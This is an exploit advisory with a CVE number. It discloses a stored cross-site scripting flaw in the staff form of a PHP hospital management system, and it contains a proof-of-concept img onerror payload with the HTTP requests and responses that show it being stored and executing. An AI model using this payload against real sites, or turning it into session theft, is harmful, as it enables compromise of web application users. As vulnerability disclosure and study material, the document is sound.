# Exploit Title: Health Care Hospital Management System - Stored Cross-Site Scripting (XSS)
# Exploit Author: Himanshu Bindra
# Date: 2024-06-05
# Vendor Homepage: https://code-projects.org/health-care-hospital-in-php-css-js-and-mysql-free-download/
# Software Link: https://download-media.code-projects.org/2020/04/Health_Care_hospital_IN_PHP_CSS_Js_AND_MYSQL__FREE_DOWNLOAD_AkGgvwi.zip
# Version: 1.0
# Tested on: Windows 11, PHP 8.2.12, Apache 2.4.58
# CVE: CVE-2024-37803

#Description: Health Care Hospital Management System v1.0 allows remote attackers to inject arbitrary web script or HTML via the 'fname' and 'lname' parameter.

#POC:
1) Go to the Staff info page in the Health Care Hospital Management System.
2) Enter the details and write your payload in the "fname", "lname" parameters. Payload : tes"><img+src=X+onerror=prompt(4356)></img>
3) Once the details are saved, view the "Staff members Details" and the javascript payload will be executed.

#Adding the Payload

HTTP Request:

POST /HMS/staff.php HTTP/1.1
Host: --REDACTED--
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:127.0) Gecko/20100101 Firefox/127.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Content-Type: application/x-www-form-urlencoded
Content-Length: 206
Origin: --REDACTED--
Connection: close
Referer: http://--REDACTED--/HMS/staff.php
Cookie: PHPSESSID=podmt61i233pamo53i63gt78f7
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: same-origin
Sec-Fetch-User: ?1
Priority: u=1

dmun=superadmin&fname=tes"><img+src=X+onerror=prompt(4356)></img>&lname=test&addr=test%40test.com&tel=998877665&email=test123@GMAIL.COM&gender=Male&smbdd=2024-06-19&typesm=Doctor&workt=Morning&submit=SUBMIT

HTTP Response:

HTTP/1.1 200 OK
Date: Mon, 17 Jun 2024 18:07:39 GMT
Server: Apache/2.4.58 (Win64) OpenSSL/3.1.3 PHP/8.2.12
X-Powered-By: PHP/8.2.12
Expires: Thu, 19 Nov 1981 08:52:00 GMT
Cache-Control: no-store, no-cache, must-revalidate
Pragma: no-cache
Connection: close
Content-Type: text/html; charset=UTF-8
Content-Length: 10412

--REDACTED--
<title>Health Care hospital</title>
<link rel="stylesheet" type="text/css" href="css/staff.css"/><script type="text/javascript" src="js/rightde.js
--REDACTED--

#Viewing the Staff details:

HTTP Request:

GET /HMS/staffmemd.php HTTP/1.1
Host: --REDACTED--
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:127.0) Gecko/20100101 Firefox/127.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Connection: close
Referer: http://--REDACTED--/HMS/staff.php
Cookie: PHPSESSID=podmt61i233pamo53i63gt78f7
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: same-origin
Sec-Fetch-User: ?1
Priority: u=1

HTTP Response:

HTTP/1.1 200 OK
Date: Mon, 17 Jun 2024 18:08:03 GMT
Server: Apache/2.4.58 (Win64) OpenSSL/3.1.3 PHP/8.2.12
X-Powered-By: PHP/8.2.12
Expires: Thu, 19 Nov 1981 08:52:00 GMT
Cache-Control: no-store, no-cache, must-revalidate
Pragma: no-cache
Content-Length: 7087
Connection: close
Content-Type: text/html; charset=UTF-8

--REDACTED--
<td align="center">tes"><img src=X onerror=prompt(4356)></img> test</td>
<td align="center">Doctor</td> --REDACTED--
